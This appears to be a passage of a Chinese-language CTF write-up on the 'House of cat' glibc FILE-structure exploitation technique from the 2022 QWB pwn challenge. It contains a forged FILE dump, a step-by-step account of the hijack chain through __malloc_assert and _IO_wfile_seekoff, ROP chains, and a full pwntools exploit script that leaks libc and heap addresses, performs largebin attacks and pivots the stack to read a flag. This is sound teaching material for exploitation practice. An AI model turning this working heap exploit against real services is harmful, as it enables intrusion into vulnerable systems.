        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _IO_last_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _codecvt = {
        __cd_in = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        },
        __cd_out = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x67616c66,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        }
      },
      _shortbuf = L"",
      _wide_vtable = 0x55f6c4a41170
    }
‍
stderr中储存的chunk0的值会作为rdi送入_IO_wfile_seekoff和_IO_switch_to_wget_mode
​​
经过一系列赋值后，我们会执行到chunk0+0xa0+0xe0+0x18地址处，即我们的magic_gadget处
​​
​​
​​
执行 _IO_WOVERFLOW劫持程序流到magic_gadget
‍
###### part 3
    #print('==============================================part 3
    pivot=p64(magic_gadget) #call rdi+0x88
    pivot+=p64(0)*4
    pivot+=p64(0xdeadbeef)
    pivot+=p64(add_rsp_ret)
    pivot+=p64(0xdeadbeef)
    pivot+=p64(heap_base+0x1178+0x30) #pivot+=p64(0)*4 4
    pivot+=p64(leave_ret)
    pivot+=rop
我们将rbp赋值为chunk0+0x48（-->chunk0+0x1b0）
​​
而下面会执行到chunk0+0x48 +0x18 + 0x28地址处（即leave_ret处）
​​
栈迁移
​​
自此，我们完全控制了程序流
‍
###### part 4
    #print('==============================================part 4
    #close(0)
    rop=p64(pop_rdi)
    rop+=p64(0)
    rop+=p64(close_addr)
    #open('flag',0)
    flag_addr=heap_base+0x1168
    rop+=p64(pop_rdi)
    rop+=p64(flag_addr)# 'flag' address
    rop+=p64(pop_rsi)
    rop+=p64(0)
    rop+=p64(pop_rax_ret)
    rop+=p64(2)
    rop+=p64(syscall)
    #read(0,heap_base+0xb40,0x50)
    rop+=p64(pop_rdi)
    rop+=p64(0)
    rop+=p64(pop_rsi)
    rop+=p64(heap_base+0xb40) #chunk12-0x10
    rop+=p64(pop_rdx_r12)
    rop+=p64(0x50)
    rop+=p64(0)
    rop+=p64(read_addr)
    #write(1,heap_base+0xb40,0x50)
    rop+=p64(pop_rdi)
    rop+=p64(1)
    rop+=p64(pop_rsi)
    rop+=p64(heap_base+0xb40) #chunk12-0x10
    rop+=p64(pop_rdx_r12)
    rop+=p64(0x50)
    rop+=p64(0)
    rop+=p64(write_addr)
要注意的一点是由于我们part3的构造，所以我们还要进行add rsp,0x18的调整以执行到rop
​​
‍
成功获取flag
​​
‍
‍
‍
##### 触发流程：
> calloc
>
> ‍
>
> _int_malloc
>
> ‍
>
> sysmalloc
>
> ‍
>
> __malloc_assert
>
> ​​
>
> __fxprintf
>
> ​​
>
> locked_vfxprintf
>
> ‍
>
> __vfprintf_internal
>
> ‍
>
> _IO_wfile_seekoff
>
> ‍
>
> _IO_switch_to_wget_mode
>
> ‍
>
> magic_gadget
>
> ‍
>
> leave_ret
>
> ‍
>
> rop
​​
‍
##### 完整exp：
    from pwn import *
    p=process('./pwn')
    libc=ELF('./libc.so.6')
    context.log_level='debug'
    s       = lambda data               :p.send(data)
    sa      = lambda x, y               :p.sendafter(x, y)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda x, y               :p.sendlineafter(x, y)
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    def add(idx,size,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n',str(1))
        sla('plz input your cat idx:\n',str(idx))
        sla('plz input your cat size:\n',str(size))
        sa('plz input your content:\n',cont)
    def delete(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(2))
        sla('plz input your cat idx:\n',str(idx))
    def show(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(3))
        sla('plz input your cat idx:\n',str(idx))
    def edit(idx,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(4))
        sla('plz input your cat idx:\n',str(idx))
        sa('plz input your content:\n', cont)
    sa('mew mew mew~~~~~~','LOGIN | r00t QWB QWXFadmin')
    add(14,0x450,b'o')
    add(13,0x450,b'p')
    delete(14)
    add(12,0x460,b'n')
    show(14)
    p.recvuntil('Context:\n')
    libc_base=l64()-0x21a0e0#-0x10-libc.sym['__malloc_hook']
    li('libc_base = '+hex(libc_base))
    heap_base = u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x290
    li('heap_base = '+hex(heap_base))
    IO_list_all = libc_base+0x21a680
    magic_gadget = libc_base+0x16a1fa
    '''
    :    mov    rbp,QWORD PTR [rdi+0x48]
    :    mov    rax,QWORD PTR [rbp+0x18]
    :    lea    r13,[rbp+0x10]
    :    mov    DWORD PTR [rbp+0x10],0x0
    :    mov    rdi,r13
    :    call   QWORD PTR [rax+0x28]
    '''
    IO_2_1_stderr = libc_base+0x21a6a0 #_IO_2_1_stderr
    stderr = libc_base+0x21a860
    IO_wfile_jumps = libc_base+0x2160c0
    lock=libc_base+0x21ba60 #_lock
    add_rsp_ret=libc_base+0x000000000003a889
    leave_ret=libc_base+0x00000000000562ec
    pop_rdi=libc_base+0x000000000002a3e5
    pop_rsi=libc_base+0x000000000002be51
    pop_rdx_r12=libc_base+0x000000000011f497
    pop_rax_ret=libc_base+0x0000000000045eb0
    syscall=libc_base+0xea5b9
    read_addr=libc_base+libc.symbols['read']
    write_addr=libc_base+libc.symbols['write']
    close_addr=libc_base+libc.symbols['close']
    add(11,0x450,b'm')
    #print('==============================================part 4
    #close(0)
    rop=p64(pop_rdi)
    rop+=p64(0)
    rop+=p64(close_addr)
    #open('flag',0)
    flag_addr=heap_base+0x1168
    rop+=p64(pop_rdi)
    rop+=p64(flag_addr)# 'flag' address
    rop+=p64(pop_rsi)
    rop+=p64(0)
    rop+=p64(pop_rax_ret)
    rop+=p64(2)
    rop+=p64(syscall)
    #read(0,heap_base+0xb40,0x50)
    rop+=p64(pop_rdi)
    rop+=p64(0)
    rop+=p64(pop_rsi)
    rop+=p64(heap_base+0xb40) #chunk12-0x10
    rop+=p64(pop_rdx_r12)
    rop+=p64(0x50)
    rop+=p64(0)
    rop+=p64(read_addr)
    #write(1,heap_base+0xb40,0x50)
    rop+=p64(pop_rdi)
    rop+=p64(1)
    rop+=p64(pop_rsi)
    rop+=p64(heap_base+0xb40) #chunk12-0x10
    rop+=p64(pop_rdx_r12)
    rop+=p64(0x50)
    rop+=p64(0)
    rop+=p64(write_addr)
    #print('==============================================part 3
    pivot=p64(magic_gadget) #call rdi+0x88
    pivot+=p64(0)*4
    pivot+=p64(0xdeadbeef)
    pivot+=p64(add_rsp_ret)
    pivot+=p64(0xdeadbeef)
    pivot+=p64(heap_base+0x1178+0x30) #pivot+=p64(0)*4 4
    pivot+=p64(leave_ret)
    pivot+=rop
    #print('==============================================part 2
    wide_data=p64(0)*4+p64(1) #_IO_write_ptr
    wide_data+=p64(0)*20
    wide_data+=b'flag\x00\x00\x00\x00' #_statep  #flag_addr
    wide_data+=p64(0)*2
    wide_data+=p64(heap_base+0x1170) #wide_data+=p64(0)*2 1
    wide_data+=pivot
    #print('==============================================part 1
    fake_file=p64(1)*4
    fake_file+=p64(0)*3
    fake_file+=p64(heap_base+0xfc0+0x1c0+0x30) #chunk0+0x1c0 -> chunk0+0x1b0
    #_IO_save_base
    fake_file+=p64(0)*7
    fake_file+=p64(lock)+p64(0)*2
    #_IO_stdfile_2_lock
    fake_file+=p64(heap_base+0x10a0) #wide_data
    #_wide_data
    fake_file+=p64(0)*6
    fake_file+=p64(IO_wfile_jumps+0x10)
    #vtable --> _IO_wfile_seekoff
    fake_file+=wide_data
    add(0,0x428,fake_file)
    add(15,0x460,'prevent merge chunk')
    add(1,0x418,b'a')
    delete(0) #ub
    add(2,0x460,b'b') #chunk0 -> largebin
    pl=p64(libc_base+0x21a0d0)*2+p64(IO_list_all)+p64(stderr-0x20)
    edit(0,pl)
    #main_arena+1104  main_arena+1104
    #IO_list_all      stderr-0x20
    delete(1) #ub
    add(3,0x440,b'c') #attack
    add(4,0x418,b'd') #r chunk1
    add(7,0x460,b'g')
    add(8,0x430,b'h')
    delete(3)
    add(9,0x460,b'i') #chunk3 -> largebin
    pl=p64(heap_base+0x2e20)+p64(libc_base+0x21a0e0)+p64(heap_base+0x2e20)+p64(heap_base+0x3263-0x20)
    edit(3,pl)
    #chunk9+0x30  main_arena+1120
    #chunk9+0x30  &TopChunk_Size+3 -0x20
    delete(8) #ub
    delete(14) 
    add(10,0x450,b'a') #attack
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(1))
    p.sendlineafter("plz input your cat idx:\n",str(6))
    dbg()
    p.sendlineafter("plz input your cat size:\n",str(0x46f))
    itr()
‍
‍
#### 参考：
[House of cat新型glibc中IO利用手法解析 && 第六届强网杯House of
cat详解](https://bbs.kanxue.com/thread-273895.htm)
[house of cat -2022强网杯pwn复现 | ZIKH26's
Blog](https://zikh26.github.io/posts/7de5a5b7.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF)
[CTF 中 glibc堆利用 及 IO_FILE
总结](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_32)
‍